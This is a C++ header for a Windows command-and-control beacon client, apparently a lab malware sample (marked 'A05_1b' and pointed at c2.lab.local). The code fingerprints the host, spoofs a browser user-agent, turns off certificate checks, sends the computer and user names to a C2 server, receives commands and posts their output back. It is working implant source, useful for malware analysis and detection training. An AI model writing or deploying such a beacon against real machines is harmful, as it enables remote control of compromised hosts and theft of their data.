#ifndef C2CLIENT_H
#define C2CLIENT_H

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <sstream>
#include <iostream>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")

using namespace std;

class C2Client
{
private:
    wstring c2Server;
    wstring agentID;
    DWORD beaconInterval;
    bool isActive;
    DWORD maxRetries;
    DWORD connectTimeout;
    DWORD requestTimeout;

    // Generate unique agent ID from machine fingerprint (ComputerName + Username)
    wstring generateAgentID()
    {
        wchar_t compName[256];
        wchar_t userName[256];
        DWORD size = 256;

        GetComputerNameW(compName, &size);
        size = 256;
        GetUserNameW(userName, &size);

        wstring raw = wstring(compName) + L"_" + wstring(userName);

        wstringstream ss;
        for (wchar_t c : raw)
        {
            ss << hex << (int)c;
        }

        return ss.str().substr(0, 16);
    }

    // Collect system info (ComputerName|Username|OSVersion)
    wstring getSystemInfo()
    {
        wchar_t compName[256], userName[256];
        DWORD size = 256;
        GetComputerNameW(compName, &size);
        size = 256;
        GetUserNameW(userName, &size);

        wstring osVersion = L"10.0.26200";

        wstringstream ss;
        ss << compName << L"|" << userName << L"|" << osVersion;

        return ss.str();
    }

    // HTTPS POST request with plaintext JSON payload
    wstring httpRequest(const wstring &endpoint, const wstring &data = L"")
    {
        wstring domain = c2Server;

        bool useHttps = true;

        if (domain.find(L"https://") == 0)
        {
            domain = domain.substr(8);
            useHttps = true;
        }
        else if (domain.find(L"http://") == 0)
        {
            domain = domain.substr(7);
            useHttps = false;
        }

        INTERNET_PORT port = useHttps ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;

        size_t portPos = domain.find(L':');
        if (portPos != wstring::npos)
        {
            port = (INTERNET_PORT)_wtoi(domain.substr(portPos + 1).c_str());
            domain = domain.substr(0, portPos);
        }

        string dataUtf8;
        int utf8Len = WideCharToMultiByte(
            CP_UTF8,
            0,
            data.c_str(),
            (int)data.length(),
            NULL,
            0,
            NULL,
            NULL);

        if (utf8Len > 0)
        {
            dataUtf8.resize(utf8Len);
            WideCharToMultiByte(
                CP_UTF8,
                0,
                data.c_str(),
                (int)data.length(),
                &dataUtf8[0],
                utf8Len,
                NULL,
                NULL);
        }

        HINTERNET hSession = WinHttpOpen(
            L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            L"(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0);

        if (!hSession)
            return L"";

        WinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &connectTimeout, sizeof(connectTimeout));
        WinHttpSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT, &requestTimeout, sizeof(requestTimeout));
        WinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &requestTimeout, sizeof(requestTimeout));

        HINTERNET hConnect = WinHttpConnect(hSession, domain.c_str(), port, 0);

        if (!hConnect)
        {
            WinHttpCloseHandle(hSession);
            return L"";
        }

        DWORD flags = useHttps ? WINHTTP_FLAG_SECURE : 0;

        HINTERNET hRequest = WinHttpOpenRequest(
            hConnect,
            L"POST",
            endpoint.c_str(),
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            flags);

        if (!hRequest)
        {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return L"";
        }

        // Keep this only if using INetSim self-signed HTTPS.
        DWORD securityFlags =
            SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID;

        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags));

        wstring headers =
            L"Content-Type: application/json\r\n"
            L"X-Lab-Sample: A05_1b\r\n";

        BOOL sent = WinHttpSendRequest(
            hRequest,
            headers.c_str(),
            (DWORD)-1L,
            dataUtf8.empty() ? WINHTTP_NO_REQUEST_DATA : (LPVOID)dataUtf8.data(),
            (DWORD)dataUtf8.size(),
            (DWORD)dataUtf8.size(),
            0);

        if (!sent)
        {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return L"";
        }

        if (!WinHttpReceiveResponse(hRequest, NULL))
        {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return L"";
        }

        string respBytes;
        DWORD bytesRead = 0;
        BYTE buffer[4096];

        while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0)
        {
            respBytes.append((const char *)buffer, bytesRead);
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        if (respBytes.empty())
            return L"";

        int wlen = MultiByteToWideChar(CP_UTF8, 0, respBytes.c_str(), (int)respBytes.size(), NULL, 0);

        if (wlen <= 0)
            return L"";

        wstring response;
        response.resize(wlen);

        MultiByteToWideChar(CP_UTF8, 0, respBytes.c_str(), (int)respBytes.size(), &response[0], wlen);

        while (!response.empty() && (response.back() == L'\r' || response.back() == L'\n' || response.back() == L'\0'))
            response.pop_back();

        return response;
    }

    wstring extractJsonValue(const wstring &json, const wstring &key)
    {
        wstring pattern = L"\"" + key + L"\"";
        size_t keyPos = json.find(pattern);
        if (keyPos == wstring::npos)
            return L"";

        size_t colonPos = json.find(L":", keyPos);
        if (colonPos == wstring::npos)
            return L"";

        size_t firstQuote = json.find(L"\"", colonPos + 1);
        if (firstQuote == wstring::npos)
            return L"";

        size_t secondQuote = json.find(L"\"", firstQuote + 1);
        if (secondQuote == wstring::npos)
            return L"";

        return json.substr(firstQuote + 1, secondQuote - firstQuote - 1);
    }

public:
    C2Client(const wstring &serverURL = L"https://c2.lab.local")
    {
        c2Server = serverURL;
        agentID = generateAgentID();

        isActive = false;

        // Store internally as milliseconds
        beaconInterval = 30000;

        maxRetries = 3;

        connectTimeout = 10000;
        requestTimeout = 30000;
    }

    // Test C2 connectivity via /api/ping
    bool testConnection()
    {
        HINTERNET hSession = WinHttpOpen(
            L"Mozilla/5.0",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0);

        if (!hSession)
            return false;

        // Parse C2 URL
        wstring domain = c2Server;
        if (domain.find(L"https://") == 0)
            domain = domain.substr(8);
        else if (domain.find(L"http://") == 0)
            domain = domain.substr(7);

        INTERNET_PORT port = INTERNET_DEFAULT_HTTPS_PORT;
        size_t portPos = domain.find(L':');
        if (portPos != wstring::npos)
        {
            port = (INTERNET_PORT)_wtoi(domain.substr(portPos + 1).c_str());
            domain = domain.substr(0, portPos);
        }

        HINTERNET hConnect = WinHttpConnect(hSession, domain.c_str(), port, 0);
        if (!hConnect)
        {
            WinHttpCloseHandle(hSession);
            return false;
        }

        HINTERNET hRequest = WinHttpOpenRequest(
            hConnect, L"POST", L"/api/ping", NULL,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);

        if (!hRequest)
        {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                              SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                              SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags));

        BOOL result = WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
        if (result)
        {
            WinHttpReceiveResponse(hRequest, NULL);
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        return result == TRUE;
    }

    vector<wstring> checkIn()
    {
        vector<wstring> commands;

#ifdef _DEBUG
        wcout << L"[C2][checkIn] Starting checkIn()..." << endl;
#endif

        // Retry loop with backoff
        for (DWORD attempt = 0; attempt < maxRetries; attempt++)
        {
            try
            {
#ifdef _DEBUG
                wcout << L"[C2][checkIn] Building payload (attempt " << (attempt + 1) << ")..." << endl;
#endif

                // Build payload: agentID|sysinfo
                wstring payload =
                    L"{\"agent_id\":\"" + agentID +
                    L"\",\"system\":\"" + getSystemInfo() +
                    L"\",\"sample\":\"A05_1b\"}";

#ifdef _DEBUG
                wcout << L"[C2][checkIn] Payload ready, calling httpRequest()..." << endl;
#endif

                wstring response = httpRequest(L"/api/checkin", payload);

#ifdef _DEBUG
                wcout << L"[C2][checkIn] httpRequest() completed, response length: " << response.length() << endl;
#endif

                // Parse JSON command response
                wstring command = extractJsonValue(response, L"command");
                wstring args = extractJsonValue(response, L"args");

                if (!command.empty())
                {
                    if (!args.empty())
                        commands.push_back(command + L"|" + args);
                    else
                        commands.push_back(command);
                }

#ifdef _DEBUG
                wcout << L"[C2][checkIn] Parsing command response..." << endl;
#endif


#ifdef _DEBUG
                wcout << L"[C2][checkIn] Parsing complete, returning " << commands.size() << L" commands" << endl;
#endif

                return commands;
            }
            catch (...)
            {
#ifdef _DEBUG
                wcout << L"[C2][checkIn] Exception caught" << endl;
#endif
                if (attempt < maxRetries - 1)
                {
                    Sleep(5000);
                    continue;
                }
            }
        }

#ifdef _DEBUG
        wcout << L"[C2][checkIn] All retries exhausted, returning empty" << endl;
#endif

        return commands;
    }

    // Send command execution result to C2 with retry logic
    void sendResult(const wstring &commandID, const wstring &status, const wstring &output)
    {
        for (DWORD attempt = 0; attempt < maxRetries; attempt++)
        {
            try
            {
                wstring payload =
                    L"{\"agent_id\":\"" + agentID +
                    L"\",\"command\":\"" + commandID +
                    L"\",\"status\":\"" + status +
                    L"\",\"output\":\"" + output +
                    L"\"}";

                httpRequest(L"/api/result", payload);
                return;
            }
            catch (...)
            {
                if (attempt < maxRetries - 1)
                    Sleep(3000);
            }
        }
    }

    void setBeaconIntervalSeconds(DWORD seconds)
    {
        beaconInterval = seconds * 1000;
    }

    DWORD getBeaconIntervalMs() const
    {
        return beaconInterval;
    }

    wstring getAgentID() const
    {
        return agentID;
    }

    wstring getC2Server() const
    {
        return c2Server;
    }

    bool isRunning() const
    {
        return isActive;
    }

    void setActive(bool active)
    {
        isActive = active;
    }
};

#endif // C2CLIENT_H